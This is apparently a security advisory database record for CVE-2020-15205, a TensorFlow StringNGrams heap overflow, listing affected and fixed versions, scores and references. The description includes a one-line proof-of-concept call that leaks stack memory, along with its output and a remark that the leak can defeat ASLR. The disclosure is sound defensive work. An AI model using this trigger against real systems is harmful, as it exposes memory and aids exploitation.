---
identifier: "CVE-2020-15205"
identifiers:
- "CVE-2020-15205"
- "GHSA-g7p5-5759-qv46"
package_slug: "pypi/tensorflow"
title: "Data leak in Tensorflow"
description: "The `data_splits` argument of [`tf.raw_ops.StringNGrams`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/StringNGrams)
  lacks validation. This allows a user to pass values that can cause heap overflow
  errors and even leak contents of memory\n```python\n>>> tf.raw_ops.StringNGrams(data=[\"aa\",
  \"bb\", \"cc\", \"dd\", \"ee\", \"ff\"], data_splits=[0,8], separator=\" \", ngram_widths=[3],
  left_pad=\"\", right_pad=\"\", pad_width=0, preserve_short_sequences=False)\nStringNGrams(ngrams=<tf.Tensor:
  shape=(6,), dtype=string, numpy=\narray([b'aa bb cc', b'bb cc dd', b'cc dd ee',
  b'dd ee ff',\nb'ee ff \\xf4j\\xa7q\\x7f\\x00\\x00q\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd8\\x9b~\\xa8q\\x7f\\x00',\nb'ff
  \\xf4j\\xa7q\\x7f\\x00\\x00q\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd8\\x9b~\\xa8q\\x7f\\x00
  \\x9b~\\xa8q\\x7f\\x00\\x00p\\xf5j\\xa7q\\x7f\\x00\\x00H\\xf8j\\xa7q\\x7f\\x00\\x00\\xf0\\xf3\\xf7\\x85q\\x7f\\x00\\x00`}\\xa6\\x00\\x00\\x00\\x00\\x00`~\\xa6\\x00\\x00\\x00\\x00\\x00\\xb0~\\xeb\\x9bq\\x7f\\x00'],...\n```\n\nAll
  the binary strings after `ee ff` are contents from the memory stack. Since these
  can contain return addresses, this data leak can be used to defeat ASLR."
date: "2024-10-30"
pubdate: "2020-09-25"
affected_range: "<1.15.4||>=2.0.0,<2.0.3||>=2.1.0,<2.1.2||>=2.2.0,<2.2.1||==2.2.0||>=2.3.0,<2.3.1||==2.3.0"
fixed_versions:
- "1.15.4"
- "2.0.3"
- "2.1.2"
- "2.2.1"
- "2.3.1"
affected_versions: "All versions before 1.15.4, all versions starting from 2.0.0 before
  2.0.3, all versions starting from 2.1.0 before 2.1.2, all versions starting from
  2.2.0 before 2.2.1, version 2.2.0, all versions starting from 2.3.0 before 2.3.1,
  version 2.3.0"
not_impacted: ""
solution: "Upgrade to versions 1.15.4, 2.0.3, 2.1.2, 2.2.1, 2.3.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2020-15205"
- "https://github.com/advisories/GHSA-g7p5-5759-qv46"
- "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g7p5-5759-qv46"
- "https://github.com/tensorflow/tensorflow/commit/0462de5b544ed4731aa2fb23946ac22c01856b80"
- "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2020-285.yaml"
- "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2020-320.yaml"
- "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2020-128.yaml"
- "https://github.com/tensorflow/tensorflow"
- "https://github.com/tensorflow/tensorflow/releases/tag/v2.3.1"
cvss_v2: "AV:N/AC:L/Au:N/C:P/I:P/A:P"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
uuid: "591adbb0-4bf0-4a18-acef-872dff770d31"
cwe_ids:
- "CWE-119"
- "CWE-122"
- "CWE-787"
- "CWE-937"
- "CWE-1035"
